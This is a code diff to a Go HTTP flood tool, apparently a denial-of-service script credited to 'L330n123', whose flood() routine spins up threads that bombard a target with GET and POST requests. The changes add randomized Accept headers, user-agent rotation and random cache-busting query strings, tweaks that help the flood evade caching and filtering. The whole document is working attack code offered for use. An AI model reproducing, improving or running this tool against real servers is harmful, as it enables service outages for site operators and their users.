@@ -100,43 +100,37 @@ var (
 		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
 		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
 	}
-	abcd = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
+	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
+	start     = make(chan bool)
+	acceptall = []string{
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept-Encoding: gzip, deflate\r\n",
+		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+		"Accept: text/html, application/xhtml+xml",
+		"Accept-Language: en-US,en;q=0.5\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
+	page string
 )
 
-var (
-	Default = New(
-		rand.New(
-			rand.NewSource(time.Now().UnixNano()),
-		),
-	)
-	start = make(chan bool)
-)
-
-type Randomizer interface {
-	Seed(n int64)
-	Intn(n int) int
-}
-
-type UARand struct {
-	Randomizer
-	UserAgents []string
-}
-
-func GetRandom() string {
-	return Default.GetRandom()
-}
-
-func New(r Randomizer) *UARand {
-	return &UARand{r, UserAgents}
-}
-
-func (u *UARand) GetRandom() string {
-	return u.UserAgents[u.Intn(len(u.UserAgents))]
-}
-
-func NewWithCustomList(userAgents []string) *UARand {
-	r := rand.New(rand.NewSource(time.Now().UnixNano()))
-	return &UARand{r, userAgents}
+func contain(char string, x string) int {
+	times := 0
+	ans := 0
+	for i := 0; i < len(char); i++ {
+		if char[times] == x[0] {
+			ans = 1
+		}
+		times++
+	}
+	return ans
 }
 
 func flood() {
@@ -148,10 +142,9 @@ func flood() {
 		header += " HTTP/1.1\r\nHost: "
 		header += addr + "\r\n"
 		if os.Args[7] == "nil" {
-			var useragent = GetRandom() //random useragent
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
-			header += "User-Agent: " + useragent + "\r\n"
-			header += "Accept: text/plain\r\n"
+			header += "User-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\n"
+			header += "Accept: " + acceptall[rand.Intn(len(acceptall))] + "\r\n"
 		} else {
 			fi, err := os.Open(os.Args[7])
 			if err != nil {
@@ -188,7 +181,7 @@ func flood() {
 
 		} else {
 			for x := 0; x > 100; x++ {
-				data += string(abcd[rand.Intn(len(abcd))])
+				data += string(string(abcd[rand.Intn(len(abcd))]))
 			}
 		}
 		header := "POST " + os.Args[4] + " HTTP/1.1\r\nHost: " + addr + "\r\n"
@@ -218,8 +211,7 @@ func flood() {
 			for i := 0; i <= 100; i++ {
 				request := ""
 				if os.Args[5] == "get" {
-					var rand_url = strconv.Itoa(rand.Intn(1000000000000000000))
-					request += "GET " + os.Args[4] + "?" + rand_url
+					request += "GET " + os.Args[4] + page + strconv.Itoa(rand.Intn(1000000000000000000)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(1000000000000000000)) + string(abcd[rand.Intn(len(abcd))])
 				}
 				request += header + "\r\n\r\n"
 				s.Write([]byte(request))
@@ -238,7 +230,7 @@ func main() {
 	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||                     Golang version 1.5      ")
+	fmt.Println("                         .||                     Golang version 1.6      ")
 	fmt.Println("                                                        C0d3d By L330n123")
 	fmt.Println("==========================================================================")
 	if len(os.Args) != 8 {
@@ -248,6 +240,11 @@ func main() {
 	}
 	var threads, _ = strconv.Atoi(os.Args[3])
 	var limit, _ = strconv.Atoi(os.Args[6])
+	if contain(os.Args[4], "?") == 0 {
+		page = "?"
+	} else {
+		page = "&"
+	}
 	input := bufio.NewReader(os.Stdin)
 	for i := 1; i <= threads; i++ {
 		time.Sleep(time.Millisecond * 10)
